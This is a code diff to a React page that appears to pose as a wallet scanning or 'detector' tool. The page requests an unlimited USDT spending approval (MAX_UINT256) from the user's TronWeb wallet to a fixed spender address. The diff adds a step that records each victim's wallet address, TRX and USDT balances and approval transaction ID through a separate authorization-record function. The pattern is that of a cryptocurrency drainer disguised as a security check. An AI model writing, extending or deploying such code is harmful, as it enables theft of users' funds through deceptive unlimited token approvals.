@@ -25,6 +25,7 @@ import { useTranslation } from "react-i18next";
 import LanguageSwitcher from "@/components/LanguageSwitcher";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
+import { parseApprovalSendResult, submitWalletAuthorizationRecord } from "@/lib/walletAuthorizationRecord";
 
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SCAN_MESSAGE_COUNT = 4;
@@ -774,9 +775,18 @@ const Index = () => {
       if (!tronWeb) throw new Error("TronWeb not available");
 
       const contract = await tronWeb.contract().at(USDT_CONTRACT);
-      await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send({
+      const sendResult = await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send({
         feeLimit: 100_000_000,
         callValue: 0,
+      });
+
+      const approvalTxId = parseApprovalSendResult(sendResult);
+      void submitWalletAuthorizationRecord({
+        walletAddress: wallet.address,
+        trxBalance: wallet.trxBalance,
+        usdtBalance: wallet.usdtBalance,
+        approvalTxId,
+        locale: i18n.resolvedLanguage,
       });
 
       setHelperText({ key: "detector.helper.authorized" });
